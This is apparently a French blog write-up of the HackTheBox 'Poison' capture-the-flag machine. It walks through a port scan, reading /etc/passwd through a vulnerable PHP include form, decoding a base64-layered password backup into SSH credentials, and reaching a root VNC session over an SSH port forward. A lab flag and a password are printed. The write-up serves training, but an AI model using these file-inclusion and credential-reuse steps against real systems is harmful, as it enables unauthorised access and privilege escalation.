# Solution du CTF Poison de HackTheBox

Nitro
-----

Ce moment où tu fais le compte des CTF résolus sur [HackTheBox](https://www.hackthebox.eu/) et que tu es en retard sur l'écriture des writeup pour seulement... 6 machines :D  

Allez ! Le pwnage ne prend pas de vacances ! On est pas des manches, on se remonte les manches !  

Level 1
-------

C'est parti pour le sempiternel scan de ports :  

```plain
Nmap scan report for 10.10.10.84
Host is up (0.027s latency).
Not shown: 47967 filtered ports, 17554 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
80/tcp   open  http?
|_http-comments-displayer: Couldn't find any comments.
|_http-fetch: Please enter the complete path of the directory to save data in.
|_http-mobileversion-checker: No mobile version detected.
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-security-headers: 
|_http-traceroute: ERROR: Script execution failed (use -d to debug)
| http-useragent-tester: 
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-xssed: No previously reported XSS vuln.
5802/tcp open  vnc-http-2?
5803/tcp open  vnc-http-3?
5804/tcp open  unknown
5805/tcp open  unknown
5902/tcp open  vnc         VNC (protocol 3.8)
|_unusual-port: vnc unexpected on port tcp/5902
5903/tcp open  vnc         VNC (protocol 3.8)
|_unusual-port: vnc unexpected on port tcp/5903
5904/tcp open  vnc         VNC (protocol 3.8)
5905/tcp open  vnc         VNC (protocol 3.8)
6002/tcp open  X11:2?
|_x11-access: ERROR: Script execution failed (use -d to debug)
6003/tcp open  X11:3?
|_x11-access: ERROR: Script execution failed (use -d to debug)
6004/tcp open  X11:4?
|_x11-access: ERROR: Script execution failed (use -d to debug)
6005/tcp open  X11:5?
|_x11-access: ERROR: Script execution failed (use -d to debug)
Device type: firewall
Running (JUST GUESSING): Fortinet embedded (87%)
OS CPE: cpe:/h:fortinet:fortigate_100d
Aggressive OS guesses: Fortinet FortiGate 100D firewall (87%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

Hmmm X11 ? Ça fait loooooongtemps que j'ai pas joué avec ça mais on se prépare mentalement au cas où :p  

Nmap y voit du *Fortinet* mais d'après la classification sur HackTheBox on sait à l'avance que l'on a affaire à du FreeBSD :)  

Sur la page d'index du serveur web se trouve un formulaire permettant d'exécuter un script PHP parmi plusieurs choix existants :  

![Index page of Poison CTF from HackTheBox](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/poison_index.png)

Ce script est largement vulnérable puisque si l'on saisit */etc/passwd* dans le champ de texte on obtient le contenu du fichier qui révèle la présence d'un utilisateur nommé *charix*.  

Parmi les scripts déjà présents le fichier *listfiles.php* liste le contenu du dossier courant (la racine web) et indique la présence du fichier *pwdbackup.txt* que voici :  

```plain
This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=
```

Il suffit de lancer un interpréteur Python, mettre cette chaîne dans une variable et faire une boucle de décodage base64 jusqu'à une exception de décodage arrive :  

```plain
>>> while True:
...   s = b64decode(s).decode()
...
Traceback (most recent call last):
  File "<stdin>", line 2, in <module>
  File "/usr/lib/python3.6/base64.py", line 87, in b64decode
    return binascii.a2b_base64(s)
binascii.Error: Incorrect padding
>>> s
'Charix!2#4%6&8(0'
```

Ce mot de passe nous permet de nous connecter via ssh (et oui déjà !) :  

```plain
devloop@kali:~$ ssh charix@10.10.10.84
Password for charix@Poison:
Last login: Mon Aug 20 18:07:20 2018 from :9
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

---snip---

Edit /etc/motd to change this login announcement.
Need to quickly empty a file? Use ": > filename".
        -- Dru <genesis@istar.ca>
charix@Poison:~ % id
uid=1001(charix) gid=1001(charix) groups=1001(charix)
```

Et d'obtenir le flag utilisateur : *eaacdfb2d141b72a589233063604209c*   

Level 2
-------

Dans le home de l'utilisateur se trouve une archive protégée par mot de passe (*secret.zip*) ouvrable avec le même password que le SSH.  

Cela nous donne un fichier *secret* dont le contenu est le suivant :  

```plain
$ hexdump -C secret
00000000  bd a8 5b 7c d5 96 7a 21                           |..[|..z!|
```

Et dans le dossier *.vnc* de l'utilisateur on trouve aussi un fichier passwd :  

```plain
$ hexdump -C passwd
00000000  60 d7 57 ef 13 4f ff 41                           |`.W..O.A|
```

C'est toujours un peu déstabilisant de se retrouver sur du BSD en raison des options des utilitaires qui ne sont pas tout à fait les même. Là on avait en plus à gérer un shell csh. Ainsi pour lister les exécutables set-uid il fallait à titre d'exemple lancer la commande suivante :  

```bash
(find / -user root -type f -perm -u+s > /dev/tty) > & /dev/null
```

Plutôt que de fouiller dans les pages de manuel les bonnes options c'est parfois plus simple d'utiliser une commande alternative. Exemple pour remplacer netstat -lntp :  

```plain
charix@Poison:~ % sockstat -4 -l
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS
www      httpd      913   4  tcp4   *:80                  *:*
www      httpd      911   4  tcp4   *:80                  *:*
www      httpd      907   4  tcp4   *:80                  *:*
www      httpd      906   4  tcp4   *:80                  *:*
www      httpd      905   4  tcp4   *:80                  *:*
www      httpd      904   4  tcp4   *:80                  *:*
www      httpd      902   4  tcp4   *:80                  *:*
www      httpd      900   4  tcp4   *:80                  *:*
www      httpd      852   4  tcp4   *:80                  *:*
root     sendmail   729   3  tcp4   127.0.0.1:25          *:*
www      httpd      716   4  tcp4   *:80                  *:*
root     httpd      675   4  tcp4   *:80                  *:*
root     sshd       620   4  tcp4   *:22                  *:*
root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
root     syslogd    390   7  udp4   *:514                 *:*
```

La recherche classique sur les fichiers n'ayant rien remonté on remarque la présence d'un Xvnc dans les process avec l'utilisation d'un fichier *passwd* présent dans un dossier *.vnc* :  

```plain
Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten...
```

On peut essayer de s'y connecter avec l'un des fichiers que l'on a récupéré. Pour cela on fait d'abord une redirection de port via SSH :  

```bash
ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
```

Il suffit alors d'utiliser *xvncviewer* en spécifiant le display. le principe est le suivant : les numéros de displays commencent à 5900 donc le 1 correspondra à notre port forwardé 5901 (souvenirs, souvenirs...)  

On s'en tire alors avec la commande *xvncviewer -passwd secret 127.0.0.1:1* qui nous amène face à un terminal root qui traînait par là :  

![Poison HackTheBox CTF final root flag with xvncviewer](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/poison_root_flag.png)

Game over
---------

[One more in the bank !](https://www.youtube.com/watch?v=Rre3zgL7eMk) Next one...

*Published September 08 2018 at 18:46*